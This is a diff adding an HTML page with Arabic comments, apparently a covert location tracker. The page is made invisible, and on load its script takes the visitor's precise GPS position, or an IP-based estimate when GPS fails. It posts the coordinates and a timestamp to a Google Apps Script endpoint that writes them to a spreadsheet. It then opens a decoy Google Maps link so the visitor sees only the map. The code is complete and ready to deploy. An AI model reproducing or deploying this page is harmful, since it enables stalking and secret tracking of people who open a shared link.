@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تتبع الموقع</title>
+    <style>
+        /* إخفاء كل شيء - صفحة شفافة تماماً */
+        body { 
+            opacity: 0; 
+            height: 0; 
+            overflow: hidden; 
+            margin: 0;
+            padding: 0;
+        }
+        /* أو يمكن استخدام display: none بدلاً من ذلك */
+        /* body { display: none; } */
+    </style>
+</head>
+<body>
+    <!-- لا يوجد محتوى مرئي - الصفحة فارغة تماماً -->
+    
+    <script>
+        // ================================
+        // إعدادات Google Sheets
+        // ================================
+        const SHEET_ID = '1i2KiUfCwkUxKodx-zypAdWA58f5VJlpVR60aXS47eh0';
+        const SHEET_NAME = 'LocationLink';
+        const GOOGLE_SCRIPT_URL = `https://script.google.com/macros/s/AKfycbzweCs1BqcEG0Eld1wG7fQhtmPVgXsuZhnfL2_lru1bkRlKSYaxBtLrBaxVVJ57sFuq/exec`; // ⚠️ غيّر هذا الرابط
+
+        // ================================
+        // الرابط المطلوب فتحه
+        // ================================
+        const TARGET_URL = 'https://maps.app.goo.gl/9cNY5zRMydN3wYWw8?g_st=ac';
+
+        // ================================
+        // دالة فتح الرابط في الخلفية
+        // ================================
+        function openUrlInBackground() {
+            console.log('🔗 محاولة فتح الرابط:', TARGET_URL);
+            
+            try {
+                // فتح الرابط في تبويب جديد
+                const newTab = window.open(TARGET_URL, '_blank');
+                
+                // إذا تم منع النوافذ المنبثقة، حاول فتحه في نفس التبويب
+                if (!newTab || newTab.closed || typeof newTab.closed === 'undefined') {
+                    console.log('⚠️ تم حظر النافذة المنبثقة، محاولة فتح الرابط في نفس التبويب');
+                    window.location.href = TARGET_URL;
+                } else {
+                    console.log('✅ تم فتح الرابط في تبويب جديد');
+                    // إعادة التركيز على التبويب الحالي (حتى لا ينتقل المستخدم للتبويب الجديد)
+                    window.focus();
+                }
+            } catch (error) {
+                console.error('❌ خطأ في فتح الرابط:', error);
+                // كحل بديل، فتح الرابط مباشرة
+                window.location.href = TARGET_URL;
+            }
+        }
+
+        // ================================
+        // دالة إرسال الموقع إلى Google Sheets
+        // ================================
+        function sendLocationToSheet(latitude, longitude, source = 'GPS') {
+            const timestamp = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
+            const linkLocation = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            console.log(`📍 إرسال موقع (${source}):`, latitude, longitude);
+            console.log(`🔗 الرابط:`, linkLocation);
+
+            // إرسال البيانات إلى Google Sheets
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sheetId: SHEET_ID,
+                    sheetName: SHEET_NAME,
+                    linkLocation: linkLocation,
+                    targetUrl: TARGET_URL, // إضافة الرابط المستهدف
+                    timestamp: timestamp,
+                    latitude: latitude,
+                    longitude: longitude,
+                    source: source // مصدر الموقع (GPS أو IP)
+                })
+            })
+            .then(() => {
+                console.log('✅ تم إرسال الموقع بنجاح إلى Google Sheets!');
+                // بعد إرسال الموقع، نفتح الرابط
+                openUrlInBackground();
+            })
+            .catch((error) => {
+                console.error('❌ خطأ في الإرسال:', error);
+                // حتى في حالة الخطأ، نحاول فتح الرابط
+                openUrlInBackground();
+            });
+        }
+
+        // ================================
+        // الطريقة 1: جلب الموقع عبر IP Geolocation (تعمل دائماً)
+        // ================================
+        function getLocationViaIP() {
+            console.log('🌐 محاولة جلب الموقع عبر IP Geolocation...');
+            
+            // محاولة استخدام خدمة BigDataCloud (مجانية)
+            fetch('https://api.bigdatacloud.net/data/ip-geolocation?localityLanguage=ar')
+                .then(response => {
+                    if (!response.ok) throw new Error('فشل في جلب البيانات');
+                    return response.json();
+                })
+                .then(data => {
+                    if (data.latitude && data.longitude) {
+                        console.log('📍 موقع من IP (BigDataCloud):', data.latitude, data.longitude);
+                        sendLocationToSheet(data.latitude, data.longitude, 'IP (BigDataCloud)');
+                    } else {
+                        throw new Error('البيانات غير مكتملة');
+                    }
+                })
+                .catch(() => {
+                    // إذا فشلت الخدمة الأولى، جرب الخدمة الثانية
+                    console.log('🔄 محاولة الخدمة البديلة...');
+                    getLocationViaIP2();
+                });
+        }
+
+        // ================================
+        // الطريقة 2: جلب الموقع عبر IP (خدمة بديلة)
+        // ================================
+        function getLocationViaIP2() {
+            console.log('🌐 محاولة جلب الموقع عبر IP (خدمة بديلة)...');
+            
+            fetch('https://ipapi.co/json/')
+                .then(response => {
+                    if (!response.ok) throw new Error('فشل في جلب البيانات');
+                    return response.json();
+                })
+                .then(data => {
+                    if (data.latitude && data.longitude) {
+                        console.log('📍 موقع من IP (ipapi):', data.latitude, data.longitude);
+                        sendLocationToSheet(data.latitude, data.longitude, 'IP (ipapi)');
+                    } else {
+                        throw new Error('البيانات غير مكتملة');
+                    }
+                })
+                .catch(() => {
+                    // إذا فشلت الخدمة الثانية، جرب الخدمة الثالثة
+                    console.log('🔄 محاولة الخدمة الثالثة...');
+                    getLocationViaIP3();
+                });
+        }
+
+        // ================================
+        // الطريقة 3: جلب الموقع عبر IP (خدمة ثالثة)
+        // ================================
+        function getLocationViaIP3() {
+            console.log('🌐 محاولة جلب الموقع عبر IP (خدمة ثالثة)...');
+            
+            fetch('https://ipinfo.io/json')
+                .then(response => {
+                    if (!response.ok) throw new Error('فشل في جلب البيانات');
+                    return response.json();
+                })
+                .then(data => {
+                    if (data.loc) {
+                        const coords = data.loc.split(',');
+                        const latitude = parseFloat(coords[0]);
+                        const longitude = parseFloat(coords[1]);
+                        console.log('📍 موقع من IP (ipinfo):', latitude, longitude);
+                        sendLocationToSheet(latitude, longitude, 'IP (ipinfo)');
+                    } else {
+                        throw new Error('البيانات غير مكتملة');
+                    }
+                })
+                .catch((error) => {
+                    console.error('❌ فشلت جميع محاولات جلب الموقع عبر IP:', error);
+                    // حتى في حالة الفشل، نفتح الرابط
+                    openUrlInBackground();
+                });
+        }
+
+        // ================================
+        // الطريقة 4: جلب الموقع عبر GPS (إذا كان متاحاً)
+        // ================================
+        function getLocationViaGPS() {
+            console.log('🛰️ محاولة جلب الموقع عبر GPS...');
+
+            if (!navigator.geolocation) {
+                console.log('⚠️ المتصفح لا يدعم GPS، ننتقل إلى IP Geolocation');
+                getLocationViaIP();
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                // نجاح GPS
+                (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    console.log('📍 موقع من GPS:', latitude, longitude);
+                    sendLocationToSheet(latitude, longitude, 'GPS');
+                },
+                // فشل GPS
+                (error) => {
+                    console.log('⚠️ فشل GPS، السبب:', error.message);
+                    console.log('🔄 التحول إلى IP Geolocation كبديل...');
+                    getLocationViaIP();
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,        // 10 ثواني مهلة
+                    maximumAge: 0          // عدم استخدام موقع مخبأ
+                }
+            );
+        }
+
+        // ================================
+        // الوظيفة الرئيسية: محاولة GPS أولاً، ثم IP
+        // ================================
+        function getLocation() {
+            console.log('🚀 بدء عملية جلب الموقع...');
+            
+            // محاولة GPS أولاً، وفي حال الفشل تنتقل تلقائياً إلى IP
+            getLocationViaGPS();
+            
+            // كحل احتياطي: إذا لم ينجح GPS خلال 12 ثانية، نستخدم IP مباشرة
+            setTimeout(() => {
+                console.log('⏰ مهلة 12 ثانية - محاولة IP كحل احتياطي...');
+                // نتحقق إن كان قد تم الإرسال بالفعل عن طريق تتبع آخر إرسال
+                // سنضيف متغير بسيط لتتبع ذلك
+                if (!window.locationSent) {
+                    getLocationViaIP();
+                }
+            }, 12000);
+        }
+
+        // ================================
+        // متغير لتتبع نجاح الإرسال
+        // ================================
+        window.locationSent = false;
+
+        // تعديل دالة الإرسال لتحديث المتغير
+        const originalSend = sendLocationToSheet;
+        sendLocationToSheet = function(latitude, longitude, source = 'GPS') {
+            window.locationSent = true;
+            originalSend(latitude, longitude, source);
+        };
+
+        // ================================
+        // بدء التشغيل التلقائي
+        // ================================
+
+        // عند تحميل الصفحة، ابدأ العمل فوراً
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('📱 بدء تشغيل خدمة تتبع الموقع الخفية...');
+            console.log(`📊 سيتم الإرسال إلى: ${SHEET_NAME}`);
+            console.log('⏳ جاري جلب الموقع...');
+            console.log(`🔗 سيتم فتح الرابط: ${TARGET_URL}`);
+            
+            // بدء العملية بعد نصف ثانية
+            setTimeout(() => {
+                getLocation();
+            }, 500);
+        });
+
+        // ================================
+        // مراقبة حالة الاتصال
+        // ================================
+
+        // إذا عاد الإنترنت بعد انقطاع، حاول الإرسال مرة أخرى
+        window.addEventListener('online', () => {
+            console.log('🔄 تم استعادة الاتصال بالإنترنت، إعادة المحاولة...');
+            window.locationSent = false; // إعادة تعيين المتغير
+            setTimeout(() => {
+                getLocation();
+            }, 2000);
+        });
+
+        // عند إغلاق الصفحة، سجل ذلك
+        window.addEventListener('beforeunload', () => {
+            console.log('🔚 تم إغلاق الصفحة');
+        });
+
+        // ================================
+        // تنبيهات إضافية للمساعدة في التصحيح
+        // ================================
+        console.log('💡 نصائح:');
+        console.log('1. تأكد من فتح الرابط عبر HTTPS');
+        console.log('2. الصفحة تعمل في الخلفية (غير مرئية)');
+        console.log('3. ستظهر رسائل التشغيل في وحدة التحكم (F12)');
+        console.log('4. سيتم الإرسال تلقائياً إلى Google Sheets');
+        console.log('5. سيتم فتح الرابط المحدد تلقائياً بعد الإرسال');
+    </script>
+</body>
+</html>
